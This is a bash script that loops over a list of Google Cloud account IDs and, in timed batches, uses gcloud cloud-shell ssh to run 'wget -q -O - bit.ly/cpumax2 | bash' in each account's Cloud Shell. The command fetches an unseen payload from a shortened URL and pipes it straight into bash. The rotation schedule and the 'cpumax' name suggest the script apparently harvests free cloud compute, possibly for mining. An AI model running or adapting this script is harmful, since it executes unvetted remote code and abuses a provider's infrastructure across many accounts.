#!/bin/bash -xe
logfile=/tmp/gshellrun.log
errlogfile=/tmp/gshellrun.log
echo > $logfile

all=$(cat $1 | wc -l)
block=$[$all/3]

while true
do
i=0
    

    awk "NR >= 1 && NR <= $[$block * 1] " $1| while read gid 
    do
    
        echo "Block 1 :"
        docker run --rm --volumes-from gcloud-config-${gid} gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/cpumax2 | bash' 1>> $logfile 2>> $errlogfile &
        echo gid $i: ${gid} 
        i=$[$i+1]
        sleep 5
    done
    sleep 1080

    awk "NR >= $[$block * 1 + 1] && NR <= $[$block * 2] " $1| while read gid 
    do
    
        echo "Block 2 :"
        docker run --rm --volumes-from gcloud-config-${gid} gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/cpumax2 | bash' 1>> $logfile 2>> $errlogfile &
        echo gid $i: ${gid} 
        i=$[$i+1]
        sleep 5
    done
    sleep 1080

    awk "NR >= $[ $block * 2 + 1] " $1| while read gid 
    do
        echo "Block 3 :"
        docker run --rm --volumes-from gcloud-config-${gid} gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/cpumax2 | bash' 1>> $logfile 2>> $errlogfile &
        echo gid $i: ${gid} 
        i=$[$i+1]
        sleep 5
    done
    sleep 1080
    
    echo reloop wait 1 min
    
    
    

sleep 60

done